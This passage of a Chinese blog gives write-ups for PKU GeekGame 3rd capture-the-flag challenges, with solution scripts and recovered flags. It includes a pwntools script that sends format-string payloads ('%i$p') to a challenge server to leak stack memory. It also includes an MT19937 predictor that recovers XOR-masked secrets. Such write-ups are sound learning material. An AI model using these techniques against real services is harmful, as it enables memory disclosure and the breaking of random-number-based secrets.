19260817\n\n\ndef backtrack(path, char_counts, result):\n    if len(path) == 16:\n        result.append(''.join(path))\n    else:\n        for char, count in char_counts.items():\n            if count > 0:\n                char_counts[char] -= 1\n                backtrack(path + [char], char_counts, result)\n                char_counts[char] += 1\n\n\ndef generate_permutations():\n    char_counts = Counter('AAAAAAEEEIOOOOOO')\n    result = []\n    backtrack([], char_counts, result)\n    return result\n\n\npermutations = generate_permutations()\nfor s in tqdm.tqdm(permutations):\n    if hash_code(s) == 7748521:\n        print(s)\n\n```\n\n很倒霉的是程序一直跑到580多万个字符串时，才遇到答案：OOAAAAEAEIEAOOOO。\n\n\nflag{OOAAAAEAEIEAOOOO}\n\n\n\n## 初学 C 语言\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n大一的小 A 在学习了《计算概论A》后，对自己的 C/C++ 水平非常自信，认为自己写出的程序不可能有 Bug （虽然可能会有写不出来的程序），于是他发起了一个悬赏，能发现程序的漏洞并读取到他服务器上的 Flag 的人，便可以狠狠奖励。\n\n\n大二的小 B 在学习了《计算机系统导论》后，看了一眼小 A 的程序，便指出你这个程序的漏洞太明显了，他根本不屑于动手去攻击。\n\n\n小 A 表示不信，仍然公开悬赏，觉得没有人可以可以拿下他的服务器。\n\n\n补充说明：\n\n\n如果你发现题目下发的程序跑不起来，建议仔细查看源码或先在本地调试。\n\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-3rd/raw/master/official_writeup/prob09-easyc/attachment/prob09.zip)\n\n{% endnote %}\n{% endhideToggle %}\n### Flag 1\n\n\n虽然C语言已经忘完了，但看到解出这一小题的人非常多，我还是决定看一眼。\n\n\n文件的主要部分是这个test函数：\n\n\n\n```c\nvoid test()\n{\n    char buf[1024];\n    char secrets[64]=\"a_very_secret_string\";\n    int secreti1=114514,secreti2=1919810;\n    char publics[64]=\"a_public_string\";\n    int publici=0xdeadbeef;\n    char flag1[64]=\"a_flag\";\n    FILE* fp=fopen(\"flag_f503be2d\",\"r\");\n    fgets(flag1,63,fp);\n    fclose(fp);\n    //get flag2 in another file\n    while(1)\n    {\n        printf(\"Please input your instruction:\\n\");\n        fgets(buf,1023,stdin);\n        if(memcmp(buf,\"exit\",4)==0)\n            break;\n        int t=printf(buf,publics,publici);\n        if(t>1024)\n        {\n            printf(\"Too long!\\n\");\n            break;\n        }\n        printf(\"\\n\");\n    }\n}\n```\n\n大概是先定义了一堆稀奇古怪好像没什么用的变量，然后读了个flag文件存到字符串flag1里面，最后循环让用户输入指令存入buf，并用buf来格式化输出publics、publici这两个字符串？由于这里buf的长度定义1024，且fgets限定了读取长度为1023，故应该没有缓冲区溢出的问题。不过注意到程序可以让用户任意输入format字符串，故还可以考虑一种曾经有所耳闻的漏洞：[格式化字符串漏洞](https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html)。\n\n\n然后又搜到一篇[博客](https://www.cnblogs.com/vi0let/articles/15978166.html)，提到了可以通过%X\\$p来查看栈上的数据，虽然我已经不会C语言了，但还是知道这些局部变量是存在栈上的，于是我从1开始试了几个，发现果然有个deadbeef（正是publici的值），不过其他对应字符串的16进制数我看不出来，所以我写了个脚本来遍历：\n\n\n\n```python\nfrom pwn import *\n\nr = remote('prob09.geekgame.pku.edu.cn', 10009)\nprint(r.recvuntil(b'token:').decode())\nr.sendline(b'YOUR_TOKEN_HERE')\nprint(r.recvuntil(b'Please input your instruction:\\n'))\nfor i in range(1, 50):\n    r.sendline(f'%{i}$p'.encode())\n    result = r.recvuntil(b'Please input your instruction:\\n').decode().split('\\n')[0]\n    if result != '(nil)':\n        result = result[2:]\n        print(result)\n        if len(result) % 2:\n            result = result[1:]\n        print(bytes.fromhex(result)[::-1])\n\n```\n\n打印的结果里还真有flag：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/00e9dd8674cc7399446619f41edf5927.png)\n不过我也不是很懂这其中的细节，等着看看官方&大佬们的题解。\n\n\nflag{Re4d_PR1nTf_c0de_SO_E4Zy}\n\n\n\n## 绝妙的多项式\n\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n> Welcome to the world of polynomial!\n\n\n小Y是一个计算机系的同学，但是非常不幸的是他需要上很多的数学专业课。\n\n\n某一天，他正看着书上一堆式子发呆的时候，突然灵光一闪，想到几个绝妙的多项式。\n\n\n他想考考你能不能猜出多项式是多少？\n\n\n当然大家都不会读心术，小Y给了你一些信息\n\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-3rd/raw/master/official_writeup/prob20-polynomial/attachment/prob20-poly.zip)\n\n{% endnote %}\n{% endhideToggle %}\n好像有什么快速傅里叶变换之类的，不过完全不懂这些并不影响我解题，毕竟mma大法好（\n\n\n### Baby\n\n\n题目只给了一个可执行文件，按惯例用ida打开，f5反编译找到main函数。main函数的逻辑比较清晰，可分为三部分，找到第一个flag对应的分支：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/2e39caa226300730d289fd1c201c2646.png)\n容易理解flag的长度为36，开始将flag每个字符以mint类型依次存入一个数组，然后进行一个二重循环，在每次内部循环结束后，将v14与内存中的某个值进行比较。由于这里的运算比较简单，可以很容易地理解这个过程：\n\n\n在每一次内层循环结束后，v14的值应该是$\\sum_{k=0}^{35}s_k\\times j^k$，\n\n\n然后定位到dword_5020变量处：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/207555098c8eb4241f6c75a06e890515.png)\n将这些值抄下来，过会用来解方程。\n\n\n容易发现这是一个36元方程组，并且有36个方程，不出意外应该是能解的，不过这里因为系数会指数爆炸，需要考虑一下整数溢出的问题。然而，研究了半天发现其实mint类型好像是自定义的，它有自己的四则运算方法。例如下面是它的乘法运算：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/4d4a50bd1a2ee3a4f9e64f8b0ed8ebbe.png)\n发现做了一个模，这样不但解决了整数溢出问题，还解决了我之前在mma脚本里模4294967296然后解不出来的问题。\n\n\n以下为第一题的mma脚本：\n\n\n\n```plaintext\nA = Table[Mod[i^j, 998244353], {i, 1, 36}, {j, 0, 35}];\nX = Array[x, 36];\nB = {3318, 382207753, 141261786, 100396702, 617742273, 385313506, \n   368063237, 562832377, 857094849, 53657966, 669496487, 605913203, \n   29815074, 762568211, 133958153, 223410103, 39956957, 937802638, \n   229055941, 767816204, 13414714, 795034084, 184947163, 171452954, \n   272370098, 484621960, 430570773, 639750081, 695262892, 144991146, \n   292318513, 573477240, 867813853, 798543925, 12064634, 874910184};\nsol = Solve[Mod[A.X, 998244353] == B && 0 <= X <= 255, X, Integers];\nsol = Values[First[sol]];\nDo[WriteString[\"stdout\", FromCharacterCode[sol[[i]]]], {i, Length[sol]}];\n```\n\nflag{yoU_Are_THE_mA<span>&#36;</span>T3r_of_l@gR4nGe}\n\n\n\n嗯？好像看到了拉格朗日？原来是拉格朗日插值公式的应用。。。已经全扔掉了\n\n\n### Easy\n\n\n查看第二个flag的逻辑：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/047590fb8c14ded030b0b2eff29796e7.png)\nflag长度为45，一开始同样将flag以mint类型存入数组，不过在数组后面添加了很多0，使得最终的长度为64。然后将其经过了一个函数sub_14BE，最后将数组元素依次与dword_105020里的内存值进行比较。那么先看看这个神奇的sub_14BE葫芦里卖的是什么药：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/935f79ddac2707356b9f03cfa6e49ffa.png)\n感觉好像有点复杂，并且这里还出现了另一块内存区域里的变量dword_405280。由于不知道这个函数在干什么，我打算先保存一下这里出现的两块内存区域dword_105020和dword_405280里的数组。\n\n\ndword_105020与前面flag1的数据类似，容易找到，不过当我去找dword_405280时，却遇到了一个问题：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/9162da212bd7503fba0da7a806394227.png)\n这怎么都是问号啊？经搜索，我发现原来前面能直接看到的内容都是存在文件的.data段的，而这个dword_405280则位于.bss段，该段存放的内容都是没经过初始化的内容，初始化过程会发生在程序开始执行以后。。。所以我还得去用gdb调试一下这个程序看看这块内存是多少。\n\n\n（恶补gdb常用命令及相关知识...）\n\n\n用gdb打开这个程序，然后用下面命令看了一下.bss段的编译地址：\n\n\n\n```bash\n(gdb) info files\n...\n    0x0000000000405040 - 0x0000000000605288 is .bss\n...\n```\n\n然后随便给程序打个断点，比如main，然后执行程序：\n\n\n\n```bash\n(gdb) b main\nBreakpoint 1 at 0x20be\n(gdb) r\nStarting program: /root/poly/prob20-poly\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n\nBreakpoint 1, 0x00005555555560be in main ()\n```\n\n此时再使用info files查看.bss的运行地址：\n\n\n\n```bash\n(gdb) info files\n...\n    0x0000555555959040 - 0x0000555555b59288 is .bss\n...\n```\n\n于是可以计算出我们需要的数据dword_405280的运行地址为0x0000555555959040 + 0x405280 - 0x0000000000405040 = 0x555555959280\n\n\n然后x一下就可以看到这些数据了：\n\n\n\n```bash\n(gdb) x/128x 0x555555959280\n0x555555959280: 0x00000000      0x00000001      0x00000001      0x3656d65b\n0x555555959290: 0x00000001      0x163456b8      0x3656d65b      0x1d21561b\n0x5555559592a0: 0x00000001      0x375fe6c1      0x163456b8      0x257c787f\n0x5555559592b0: 0x3656d65b      0x16400573      0x1d21561b      0x2766e2ab\n0x5555559592c0: 0x00000001      0x1afd27ac      0x375fe6c1      0x27b55371\n0x5555559592d0: 0x163456b8      0x0a25e8c8      0x257c787f      0x337e65be\n0x5555559592e0: 0x3656d65b      0x24c90037      0x16400573      0x20677ed8\n0x5555559592f0: 0x1d21561b      0x267c5b5f      0x2766e2ab      0x3647fc39\n0x555555959300: 0x00000001      0x3700cccc      0x1afd27ac      0x00e5b307\n0x555555959310: 0x375fe6c1      0x131d28f6      0x27b55371      0x13477c50\n...\n```\n\n现在已经有了数据，只差那一团乱七八糟的循环，不过与其分析伪代码让自己头疼半天，还不如直接用mma写一下这个函数，然后解解看。mma果然不负众望，不到一秒就出了结果。\n\n\nflag{yOU_kN0w_wH47_1S_f4<span>&#36;</span>t_fOuRiEr_7r4n<span>&#36;</span>F0RM}\n\n\n啊，居然是快速傅里叶变换？\n\n\n### Hard\n\n\n第三个flag和第二个没啥区别，无非是操作变量的步骤又多了几个罢了，依然可以用mma复现过程然后硬解，大概花了十几秒后得到flag为：\n\n\nflag{Welcome_t0_7hE_WorlD_Of_Po1YNoMi@l}\n\n\n\n<a href=\"https://oss.fyz666.xyz/blogfiles/zip/38aeddc93d8126d374d156b8ed27f109.zip\" download=\"mma-code.zip\">Easy和Hard的解题代码</a>\n\n## 关键词过滤喵，谢谢喵\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n你好喵，我是粉色头发的少女喵，王牌发明家喵！\n\n\n我擅长过滤文本中的一些关键词喵，附件里的程序是我最新的发明：\\*\\*filtered\\*\\* 喵！\n\n\n把它交给了一个英国小女孩，看起来效果很不错喵！\n\n\n这个程序可以进行正则匹配喵，就像你可以同时使用 关.\\*?喵，.\\*?谢谢喵 来匹配“关注⭕️⭕️⭕️⭕️喵，关注⭕️⭕️⭕️⭕️谢谢喵”和这道题目的标题“关键词过滤喵，谢谢喵”——当你理解了这一点，你就理解了正则喵！\n\n\n为了过滤更复杂的东西，甚至是进行文本替换，你可以写一些像这样的规则喵：\n\n\n\n\n```plaintext\n  重复把【 】替换成【】喵\n  如果看到【MaxXing】就跳转到【什么也不做】喵\n  把【关注(.+?)喵】替换成【举办\\1喵】喵\n\n什么也不做：\n  谢谢喵\n```\n\n把它输入给程序，程序就可以按照你的要求处理文本了喵，很方便喵！\n\n\n现在你已经完全掌握了最先进的关键词过滤技术了喵（建议再仔细看看程序的实现喵），接下来请帮我完成一些工作喵！\n\n\n谢谢喵！\n\n\n\n\n> 注意喵，所有 flag 的输入里都不会出现 emoji 喵，可能在做文本替换的时候有用喵！\n> \n> \n> 每个 flag 的具体评测规则见附件的 judge.py 喵！\n\n\n[本题附件喵](https://github.com/PKU-GeekGame/geekgame-3rd/raw/master/official_writeup/prob04-filtered/attachment/prob04-src.zip)\n\n{% endnote %}\n{% endhideToggle %}\n### 字数统计喵\n\n\n输入一个字符串，输出 10 进制的字符串长度喵，结果需要和 Python 中的 len(...) 保持一致喵！\n\n\n\n想了半天也就能勉强做做第一题喵！\n\n\n其实这题因为题面看上去有点啰嗦喵（各种喵），代码也不少，一开始压根没看喵，在一阶段快结束时才仔细看了一下评测代码喵。大概是用只有正则替换语句和条件跳转语句的脚本来实现一些功能喵。\n\n\n于是我搜了搜Regex Turing-Complete喵，试图找到一些东西喵，不过出来的基本都是说“正则表达式图灵不完备”之类的喵，没怎么看到加上跳转语句的讨论喵。在看了二阶段提示后才发现有这么个我没搜到的神奇的编程语言喵：[REGXY](https://esolangs.org/wiki/REGXY)，看上去和这题的逻辑一模一样喵。\n\n\n对于第一题，我从长度不超过9的字符串来入手喵，可以先写下面几句来处理这类字符串喵：\n\n\n\n```plaintext\n把【.|\\n】替换成【x】喵\n如果没看到【x】就跳转到【空串】喵\n\n开始：\n把【x{9}】替换成【9】喵\n把【x{8}】替换成【8】喵\n把【x{7}】替换成【7】喵\n把【x{6}】替换成【6】喵\n把【x{5}】替换成【5】喵\n把【x{4}】替换成【4】喵\n把【x{3}】替换成【3】喵\n把【x{2}】替换成【2】喵\n把【x】替换成【1】喵\n\n如果看到【.】就跳转到【结束】喵\n\n空串：\n把【.*】替换成【0】喵\n\n结束：\n谢谢喵\n```\n\n以上语句即可实现长度0-9的文本的处理喵。先将字符串替换为等长度的x，然后将这些x按个数替换为对应的数字喵。另外空字符串需要另写一个分支进行处理喵！\n\n\n不过这样还解决不了任意长度的字符串喵，由于我们不知道最长的字符串文本有多长，而且脚本还有长度限制喵，因此不可能用这种方法来处理任意长度的字符串喵。并且如果写了这种规则：`把【x{10}】替换成【10】喵`，将10个x处理成两个字符，也会增加后续处理的难度喵。\n\n\n那么能不能像数的进制一样，用另一个不同的字母来代替十位，从而解决10-99的情况喵？\n\n\n例如在`把【x{9}】替换成【9】喵`之前先加一条`把【x{10}】替换成【y】喵`，如此，对于一个长度为10-99的字符串，我们希望它先被处理为\"y+[0-9]\"的形式喵（即至少1个y后面跟一个0-9），然后对y进行前面一模一样的操作喵，将多个y替换为对应长度的数字喵：\n\n\n\n```plaintext\n把【y{9}】替换成【9】喵\n把【y{8}】替换成【8】喵\n把【y{7}】替换成【7】喵\n把【y{6}】替换成【6】喵\n把【y{5}】替换成【5】喵\n把【y{4}】替换成【4】喵\n把【y{3}】替换成【3】喵\n把【y{2}】替换成【2】喵\n把【y】替换成【1】喵\n```\n\n不过这里仍存在一个问题喵：当字符串长度恰好为整10，例如20时，它在第一步会被替换为yy喵，这样会在后面被替换成2，少了个0喵。因此在做完`把【x{10}】替换成【10】喵`这条规则后，我们还需要考虑一下这种情况喵。这里我们先暂时加上一条：`把【y$】替换成【y0】喵`，用来给上面这种情况补0喵。\n\n\n与之前同理，我们仍处理不了长度在100及以上的文本喵。例如当文本长度为100时，会先转换为yyyyyyyyyy0，而我们并没有写10个y的情况喵。不过，可以与前面x部分的处理一样喵，我们在这里将10个y处理回x，再对整十的情况进行补0喵，并且在最后加一个`如果看到【x】就跳转到【开始】喵`跳回开头处理喵。因此我们目前的脚本如下喵：\n\n\n\n```plaintext\n把【.|\\n】替换成【x】喵\n如果没看到【x】就跳转到【空串】喵\n\n开始：\n把【x{10}】替换成【y】喵\n把【y$】替换成【y0】喵\n把【x{9}】替换成【9】喵\n把【x{8}】替换成【8】喵\n把【x{7}】替换成【7】喵\n把【x{6}】替换成【6】喵\n把【x{5}】替换成【5】喵\n把【x{4}】替换成【4】喵\n把【x{3}】替换成【3】喵\n把【x{2}】替换成【2】喵\n把【x】替换成【1】喵\n\n把【y{10}】替换成【x】喵\n把【x$】替换成【x0】喵\n把【y{9}】替换成【9】喵\n把【y{8}】替换成【8】喵\n把【y{7}】替换成【7】喵\n把【y{6}】替换成【6】喵\n把【y{5}】替换成【5】喵\n把【y{4}】替换成【4】喵\n把【y{3}】替换成【3】喵\n把【y{2}】替换成【2】喵\n把【y】替换成【1】喵\n如果看到【x】就跳转到【开始】喵\n\n如果看到【.】就跳转到【结束】喵\n\n空串：\n把【.*】替换成【0】喵\n\n结束：\n谢谢喵\n```\n\n不过容易发现这样的脚本仍存在问题喵：例如这个脚本处理长度为100的文本过程是这样的喵：\n\n\n1. xxxxx...xxx(100个x)\n2. yyyyyyyyyy\n3. yyyyyyyyyy0\n4. x0\n5. 10\n\n发现还是少了个0喵，原因是在这种情况下，用\"x$\"无法匹配到\"x0\"，故没能将\"x0\"补为\"x00\"喵。因此我们要将`把【y$】替换成【y0】喵`和`把【x$】替换成【x0】喵`这两条规则修改一下喵，让它们能分别匹配“y后边跟着数字”以及“x后边跟着数字”的情况（这两种情况意味着上一个阶段遇到了整十，否则y后边一定会跟着数个x；x后边一定会跟着数个y）喵。我们要将诸如\"y\\d+\"这样的串替换为\"y0\\d+\"喵，这种情况下需要用正则表达式的捕获组功能，将末尾的数字进行捕获，并原样添加回原字符串喵：`把【y(\\d*$)】替换成【y0\\1】喵`\n\n\n经过如上的修改，最终的脚本如下喵：\n\n\n\n```plaintext\n把【.|\\n】替换成【x】喵\n如果没看到【x】就跳转到【空串】喵\n\n开始：\n把【x{10}】替换成【y】喵\n把【y(\\d*$)】替换成【y0\\1】喵\n把【x{9}】替换成【9】喵\n把【x{8}】替换成【8】喵\n把【x{7}】替换成【7】喵\n把【x{6}】替换成【6】喵\n把【x{5}】替换成【5】喵\n把【x{4}】替换成【4】喵\n把【x{3}】替换成【3】喵\n把【x{2}】替换成【2】喵\n把【x】替换成【1】喵\n\n把【y{10}】替换成【x】喵\n把【x(\\d*$)】替换成【x0\\1】喵\n把【y{9}】替换成【9】喵\n把【y{8}】替换成【8】喵\n把【y{7}】替换成【7】喵\n把【y{6}】替换成【6】喵\n把【y{5}】替换成【5】喵\n把【y{4}】替换成【4】喵\n把【y{3}】替换成【3】喵\n把【y{2}】替换成【2】喵\n把【y】替换成【1】喵\n如果看到【x】就跳转到【开始】喵\n\n如果看到【.】就跳转到【结束】喵\n\n空串：\n把【.*】替换成【0】喵\n\n结束：\n谢谢喵\n```\n\n经测试该脚本确实能拿到flag1喵！\n\n\nflag{W0w_YoU_C4n_REal1y_rEGex}\n\n\n\n因为做这题的时间太晚了喵，后面两个小题没时间思考了喵（思考了估计也不会喵），回头拜读一下大佬们的题解喵。\n\n\n## 小章鱼的曲奇\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\nSmol Tako 是一只小章鱼。\n\n\n众所周知，章鱼都很喜欢吃曲奇。作为一名资深的曲奇评论家，Smol Tako 更是只身前往世界各地，寻找最美味、最具特色的曲奇。\n\n\n终于，跟随一张古老的藏宝图，Smol Tako 来到了 ⱦħē łⱥꞥđ ꝋӻ đēłīꞡħⱦ。据说，在这里的深渊，驻守着 Ancient Tako，它守护着世界上最美味的曲奇。但 Ancient Tako 使用的语言是古神之语，Smol Tako 无法理解。它找到了精通网络安全的你，希望你能帮助它翻译古神之语，让它获得曲奇。\n\n\n\n[本题附件](https://github.com/PKU-GeekGame/geekgame-3rd/raw/master/official_writeup/prob08-cookie/attachment/prob08-server.py)\n\n{% endnote %}\n{% endhideToggle %}\n很遗憾，这题出题人在flag3漏了一个条件，以至于难度大幅降低，而flag2也有异常简单的非预期解。\n\n\n### Smol Cookie\n\n\n\n```python\nif option == 1:\n    # [THE ANCIENT TAKO HAS HIJACKED THE CODE]\n    the_void = Random(secrets.randbits(256))\n\n    smol_cookie = open('flag1', 'r').read()\n    words = b'\\0' * 2500 + smol_cookie\n    ancient_words = xor_arrays(words, the_void.randbytes(len(words)))\n\n    # [We've regained control of the code!]\n    print('*You heard a obscure voice coming from the void*')\n    print(ancient_words.hex())\n```\n\n注意到这里给了2500个连续且已知的随机数字节，正好比624 \\* 4 = 2496多一点点，那么就是一个典型的mt19937预测题。调用MT19937Predictor来做即可：\n\n\n\n```python\nfrom pwn import *\nfrom mt19937predictor import MT19937Predictor\n\n\ndef xor_arrays(a, b, *args):\n    if args:\n        return xor_arrays(a, xor_arrays(b, *args))\n    return bytes([x ^ y for x, y in zip(a, b)])\n\n\ndef solve(hex_str):\n    predictor = MT19937Predictor()\n    b = bytes.fromhex(hex_str)\n    for i in range(624):\n        predictor.setrandbits(int.from_bytes(b[i * 4: (i + 1) * 4], 'little'), 32)\n    predicted_bytes = bytearray()\n    for _ in range(10):\n        predicted_value = predictor.getrandbits(32)\n        predicted_bytes.extend(predicted_value.to_bytes(4, 'little'))\n    print(xor_arrays(b[2496:], predicted_bytes))\n\n\nr = remote('prob08.geekgame.pku.edu.cn', 10008)\nprint(r.recvuntil(b'token:'))\nr.sendline(b'YOUR_TOKEN_HERE')\nprint(r.recvuntil(b'Choose one: ').decode())\nr.sendline(b'1')\nlines = r.recvlinesS(3)\nhex_str = lines[-1].strip()\nsolve(hex_str)\n```\n\nflag{ranD0m_1s_EZ_2_pREd1cT}\n\n\n\n### Big Cookie\n\n\n\n```python\nelif option == 2:\n    # [Not again!]\n    seed1 = secrets.randbits(256)\n\n    print('Ƀēħꝋłđ, ⱦħīꞥē ēɏēꞩ đꝋꞩⱦ ȼⱥⱦȼħ ⱥ ӻɍⱥꞡᵯēꞥⱦ ꝋӻ ēꞩꝋⱦēɍīȼ ēꞥīꞡᵯⱥ, ⱥ ᵯēɍē ꞡłīᵯᵯēɍ ⱳīⱦħīꞥ ⱦħē ӻⱥⱦħꝋᵯłēꞩꞩ ⱥƀɏꞩꞩ.')\n    print(f'<{seed1:x}>')\n    print()\n\n    print('Ⱳħⱥⱦ ɍēꞩꝑꝋꞥꞩē đꝋꞩⱦ ⱦħꝋᵾ ꝑɍꝋӻӻēɍ, ꝑᵾꞥɏ ᵯꝋɍⱦⱥł?')\n    seed2 = int(input('> '), 16)\n    print()\n\n    if seed1 == seed2:\n        print('Ӻēēƀłē ᵯīᵯīȼɍɏ ꝋӻ ⱦɍᵾē ꞩⱥꞡⱥȼīⱦɏ.')\n        print('NO COOKIES FOR YOU!')\n\n        quit()\n\n    void1 = Random(seed1)\n    void2 = Random(seed2)\n    void3 = Random(secrets.randbits(256))\n\n    entropy = secrets.randbits(22)\n    void1.randbytes(entropy)\n    void2.randbytes(entropy)\n\n    big_cookie = open('flag2', 'r').read()\n    words = b'\\0' * 2500 + big_cookie\n    n = len(words)\n    ancient_words = xor_arrays(words, void1.randbytes(\n        n), void2.randbytes(n), void3.randbytes(n))\n\n    # [We've regained control of the code!]\n    print('*You heard a more obscure voice coming from the void*')\n    print(ancient_words.hex())\n```\n\n这题出现了三个随机数发生器，虽然我们可以知道其中两个的seed，但它们在生成ancient_words之前预先推进了很多个字节，导致我们无法知晓这两个随机数生成器生成的数。这里我最开始的思路是，找一个不同于seed1的seed2，使得其得到的随机数生成器状态与seed1相同，这样void1和void2一异或就抵消了，只剩个void3，退化为第一小题的情形。然后我倒是找到了很多逆向mt19937算法的实现，并且写完了由前624个32位整数恢复出生成器初始状态的算法，不过紧接着就发现Python的mt19937的初始状态用的不是网上容易搜到的经典算法来生成的，还得去看Python中[random的实现](https://github.com/python/cpython/blob/main/Modules/_randommodule.c)，看看如何由seed得到初始状态，因为C语言看不懂一点，于是当时先放着这题看了看第三个flag，结果发现第三个flag出奇的简单，因此感觉这第二个flag应该不会那么难才对，遂从其他角度重新思考。\n\n\n后来发现，由于mt19937本质还是一个线性算法，那么它很可能是线性可和的，例如两个梅森旋转算法生成的序列之和会不会仍是一个梅森旋转算法序列？对于异或运算又是不是也是如此？\n\n\n验证这个结论只需要拿flag1的脚本来跑一下这个题，结果真能跑出flag2。\n\n\nflag{cRAfT1Ng_sEEd_cAn_b3_fuUuN}\n\n\n\n看来预期解确实和我想的差不多，需要搞一个seed出来。赛后再研究研究。\n\n\n### SUPA BIG\n\n\n\n```python\nelif option == 3:\n    # [THE ANCIENT TAKO HAS HIJACKED THE CODE, FOR THE LAST TIME]\n    signal.alarm(10)\n    print('Ⱦħē đⱥɏ ꝋӻ ɍēȼҟꝋꞥīꞥꞡ đɍⱥⱳēⱦħ ꞥīꞡħ ⱳīⱦħ ħⱥꞩⱦē. Ħⱥꞩⱦēꞥ, ꝋɍ ӻꝋɍӻēīⱦ ⱥłł.')\n\n    rounds_of_curses = 100\n    curses = [secrets.randbits(256) for _ in range(rounds_of_curses)]\n\n    print('<' + ','.join(map(hex, curses)) + '>')\n    print()\n\n    print('Ⱳħⱥⱦ ɍēꞩꝑꝋꞥꞩē đꝋꞩⱦ ⱦħꝋᵾ ꝑɍꝋӻӻēɍ, ꝑᵾꞥɏ ᵯꝋɍⱦⱥł?')\n    its_seeds = map(lambda x: int(x, 16), input('> ').split(','))\n\n    for curse, its_seed in zip(curses, its_seeds):\n        t1 = Random(curse).randbytes(2500)\n        t2 = Random(its_seed).randbytes(2500)\n        if t1 != t2:\n            print('YOU DEMISE HAS OCCURRED.')\n            quit()\n\n    print('Good job, Smol Tako! Here\\'s your delicious SUPA BIG cookie! uwu')\n    print(open('flag3', 'r').read())\n```\n\n看了下代码，大眼瞪小眼一分钟以后意识到只要把发来的数据复读一遍好像就过了。。。\n\n\nflag{PYthOn_rAnd0m_sOo000oO0oOoO0OoOO000_eaSy}\n\n\n\n不过出题人的意图应该还是想让我们去找一组数值不同但随机效果相同的seed，只是漏了条件。\n\n\n## 华维码\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n想要获得华维 Mate 60？首先你得来试一试华维码！\n\n\n**Huavvei Mate Hard？华维码 · 特难！**\n\n\n\n\n> Q: 怪，华容道为什么会和二维码搭上关系？\n> \n> \n> A: 这你就不知道了，这是多么遥遥领先的出题思路！\n\n\n**Huavvei Mate Nano？华维码 · 特小！**\n\n\n\n\n> Q: Hard 难度我能理解，但 Nano 是什么难度？\n> \n> \n> A: 你看那些华容道格子是不是很 Nano？\n\n\n<a href=\"https://oss.fyz666.xyz/blogfiles/zip/ab88312f44c66b20d6919894153d38dc.zip\" download=\"qrcode.zip\">本题附件</a>\n{% endnote %}\n{% endhideToggle %}\n### 华维码 · 特难\n\n\n把素材下载下来，发现素材图片文件被自动重命名为1-24的数字，然后又发现按数字排序拼接正好能拼出一个二维码。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/8189b4456987400a3640e6fc776d1a94.png)\n当时觉得既然给出了打乱顺序，那么这题的考点应该就是用算法去拼图嘛，所以没去扫那个二维码，而是用搜索算法把拼图解了出来，然后写了个脚本去网页玩：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/41b9af74aca53b57953ef082bf4c041b.png)\n解出第一小题后，我先去做了个别的题，后来再回过头来下载第二小题的图片素材时，发现文件名变成了乱码，再尝试下载第一题的素材，也变成了乱码文件名。。。这才意识到不对劲，然后扫了一下第一题拼出来的二维码，发现直接就能扫出flag。。。原来之前题目有bug，而现在组委会默默把这个bug修了。。因为我之前没预先下载第二小题的素材，导致没法用这个非预期方法做第二小题。用预期方法显然是不会的，眼睛看花了QAQ。\n\n\n原来这题的考点是如何把二维码还原啊！\n\n\n既然从思路上就严重偏离了预期解，这题的解题代码就不贴了。\n","tags":["GeekGame","GeekGame 3rd"],"categories":["CTF题解"]},{"title":"PKU GeekGame 3rd题解（一）","url":"//blog/8499/","content":"\n本文是本次PKU GeekGame题解的第一部分。\n\n\n\n## 一眼盯帧\n\n\n[本题附件](https://raw.githubusercontent.com/PKU-GeekGame/geekgame-3rd/master/official_writeup/prob23-signin/attachment/prob23-signin.gif)\n从没见过如此简单直接的签到题，~~只要眼睛够快，看一遍动图就能算出flag。~~\n\n\n拿到题，搜个在线GIF逐帧查看器，然后把字符抄一下，发现前四个字母是synt，就搜了一个在线rot13解码网站，解出flag。但动作慢了，只抢了8血。\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/928c7c1ca58e4bd39bf5de52311d7363.png)\n## 小北问答!!!!!\n\n\n这次的问答题属实有点难顶，提交居然有一小时冷却时间。。。就算防爆破，冷却时间设个一分钟也差不多了，一小时的话就，真的很急急急！\n\n\n题目如下：\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n1. 在北京大学（校级）高性能计算平台中，什么命令可以提交一个非交互式任务？  \n**答案格式：^[a-z]+$**\n2. 根据 GPL 许可证的要求，基于 Linux 二次开发的操作系统内核必须开源。例如小米公司开源了 Redmi K60 Ultra 手机的内核。其内核版本号是？  \n**答案格式： ^\\d+\\.\\d+\\.\\d+$**\n3. 每款苹果产品都有一个内部的识别名称（Identifier），例如初代 iPhone 是 iPhone1,1。那么 Apple Watch Series 8（蜂窝版本，41mm 尺寸）是什么？  \n**答案格式： ^[a-zA-Z]+\\d+,\\d+$**\n4. 本届 PKU GeekGame 的比赛平台会禁止选手昵称中包含某些特殊字符。截止到 2023 年 10 月 1 日，共禁止了多少个字符？（提示：本题答案与 Python 版本有关，以平台实际运行情况为准）  \n**答案格式： ^\\d+$**\n5. 在 2011 年 1 月，Bilibili 游戏区下共有哪些子分区？（按网站显示顺序，以半角逗号分隔）  \n**答案格式： ^[A-Za-z一-龟·,]+$**\n6. [这个照片](https://github.com/PKU-GeekGame/geekgame-3rd/blob/master/official_writeup/prob18-trivia/media/osint-challenge.jpg?raw=true)中出现了一个大型建筑物，它的官方网站的域名是什么？（照片中部分信息已被有意遮挡，请注意检查答案格式）  \n**答案格式： ^[a-z0-9-]+\\.[a-z0-9]{2,3}$**\n\n{% endnote %}\n{% endhideToggle %}\n我的解题过程如下：\n\n\n1. <s>问ChatGPT</s> 或者直接找到北京大学高性能计算平台的[文档](https://hpc.pku.edu.cn/_book/guide/slurm/slurm.html)。可得到答案是sbatch\n2. 